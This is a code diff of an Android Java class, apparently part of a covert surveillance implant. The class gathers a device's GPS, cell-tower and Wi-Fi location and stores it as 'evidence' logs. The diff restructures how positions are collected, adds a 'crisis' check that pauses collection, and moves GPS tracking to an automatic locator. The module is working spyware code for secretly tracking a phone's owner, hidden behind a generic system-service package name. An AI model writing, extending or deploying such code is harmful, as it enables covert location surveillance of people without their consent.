@@ -30,14 +30,13 @@ import com.android.service.conf.ConfigurationException;
 import com.android.service.evidence.Evidence;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.IncrementalLog;
-import com.android.service.module.position.GPSLocator;
-import com.android.service.module.position.GPSLocatorPeriod;
+import com.android.service.module.position.GPSLocatorAuto;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
 import com.android.service.util.Utils;
 
-public class ModulePosition extends BaseModule implements IncrementalLog, LocationListener {
+public class ModulePosition extends BaseInstantModule implements IncrementalLog, LocationListener {
 	private static final String TAG = "ModulePosition"; //$NON-NLS-1$
 	private static final int TYPE_GPS = 1;
 	private static final int TYPE_CELL = 2;
@@ -50,8 +49,6 @@ public class ModulePosition extends BaseModule implements IncrementalLog, Locati
 	private static final int LOG_TYPE_CDMA = 5;
 	private static final long POSITION_DELAY = 100;
 
-	GPSLocator locator;
-
 	private boolean gpsEnabled;
 	private boolean cellEnabled;
 	private boolean wifiEnabled;
@@ -62,17 +59,30 @@ public class ModulePosition extends BaseModule implements IncrementalLog, Locati
 
 	@Override
 	public void actualStart() {
+		if (Status.self().crisisPosition()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Warn: " + "Crisis!");//$NON-NLS-1$ //$NON-NLS-2$
+			}
+			return;
+		}
 
 		if (gpsEnabled) {
-			logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS));
+			if (logIncrGPS == null) {
+				logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS));
+			}
+			locationGPS();
 		}
 
 		if (cellEnabled) {
-			logIncrCell = factoryCellLog();
+			if (logIncrCell == null) {
+				logIncrCell = factoryCellLog();
+			}
+			locationCELL();
 		}
 
-		locator = new GPSLocatorPeriod(this, period);
-		locator.start();
+		if (wifiEnabled) {
+			locationWIFI();
+		}
 
 	}
 
@@ -94,26 +104,6 @@ public class ModulePosition extends BaseModule implements IncrementalLog, Locati
 		}
 
 		return logCell;
-	}
-
-	@Override
-	public void actualStop() {
-		locator.halt();
-		try {
-			locator.join();
-		} catch (final InterruptedException e) {
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-		}
-		locator = null;
-
-		if (logIncrCell != null) {
-			logIncrCell.close();
-		}
-		if (logIncrGPS != null) {
-			logIncrGPS.close();
-		}
 	}
 
 	@Override
@@ -146,42 +136,10 @@ public class ModulePosition extends BaseModule implements IncrementalLog, Locati
 		return true;
 	}
 
-	@Override
-	public void actualGo() {
-
-		if (Status.self().crisisPosition()) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Warn: " + "Crisis!");//$NON-NLS-1$ //$NON-NLS-2$
-			}
-			return;
-		}
-
-		if (gpsEnabled) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " actualRun: gps");//$NON-NLS-1$
-			}
-
-			locationGPS();
-		}
-
-		if (cellEnabled) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " actualRun: cell");//$NON-NLS-1$
-			}
-
-			locationCELL();
-		}
-
-		if (wifiEnabled) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " actualRun: wifi");//$NON-NLS-1$
-			}
-
-			locationWIFI();
-		}
-	}
-
 	private void locationWIFI() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (locationWIFI)");
+		}
 		final WifiManager wifiManager = (WifiManager) Status.getAppContext().getSystemService(Context.WIFI_SERVICE);
 
 		final WifiInfo wifi = wifiManager.getConnectionInfo();
@@ -217,7 +175,9 @@ public class ModulePosition extends BaseModule implements IncrementalLog, Locati
 	 * neighboringcellinfo-cid-and-lac
 	 */
 	private void locationCELL() {
-
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (locationCELL)");
+		}
 		final CellInfo info = Device.getCellInfo();
 		if (!info.valid) {
 			if (Cfg.DEBUG) {
@@ -243,54 +203,12 @@ public class ModulePosition extends BaseModule implements IncrementalLog, Locati
 	}
 
 	private void locationGPS() {
-		if (locator == null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: " + "GPS Not Supported on Device");//$NON-NLS-1$ //$NON-NLS-2$
-			}
-			return;
-		}
-
-		if (lastLocation == null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " waitingForPoint");//$NON-NLS-1$
-			}
-
-			return;
-		}
-
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " newLocation");//$NON-NLS-1$
+			Check.log(TAG + " (locationGPS)");
 		}
 
-		byte[] payload;
-		synchronized (this) {
-			final long timestamp = lastLocation.getTime();
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " valid");//$NON-NLS-1$
-			}
-
-			payload = getGPSPayload(lastLocation, timestamp);
-			lastLocation = null;
-		}
-
-		// new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
-		// getAdditionalData(0, LOG_TYPE_GPS), payload);
-
-		synchronized (this) {
-			logIncrGPS.write(payload);
-		}
-
-		/*
-		 * Evidence logGPS = new Evidence(EvidenceType.LOCATION_NEW);
-		 * logGPS.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
-		 * EvidenceType.LOCATION_NEW); logGPS.writeEvidence(payload);
-		 * logGPS.close();
-		 */
-
+		GPSLocatorAuto.self().start(this);
 	}
-
-	Location lastLocation;
 
 	public void onLocationChanged(Location location) {
 		if (location != null) {
@@ -300,8 +218,20 @@ public class ModulePosition extends BaseModule implements IncrementalLog, Locati
 				Check.log(TAG + " lat: " + lat + " lon:" + lng);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
+
+		byte[] payload;
 		synchronized (this) {
-			lastLocation = location;
+			final long timestamp = location.getTime();
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " valid");//$NON-NLS-1$
+			}
+
+			payload = getGPSPayload(location, timestamp);
+		}
+
+		synchronized (this) {
+			logIncrGPS.write(payload);
 		}
 
 	}
@@ -576,14 +506,12 @@ public class ModulePosition extends BaseModule implements IncrementalLog, Locati
 		}
 		if (logIncrCell != null && logIncrCell.hasData()) {
 			logIncrCell.close();
-			logIncrCell = factoryCellLog();
+			logIncrCell = null;
 		}
 
 		if (logIncrGPS != null && logIncrGPS.hasData()) {
 			logIncrGPS.close();
-			if (gpsEnabled) {
-				logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GPS));
-			}
+			logIncrGPS = null;
 		}
 	}
 
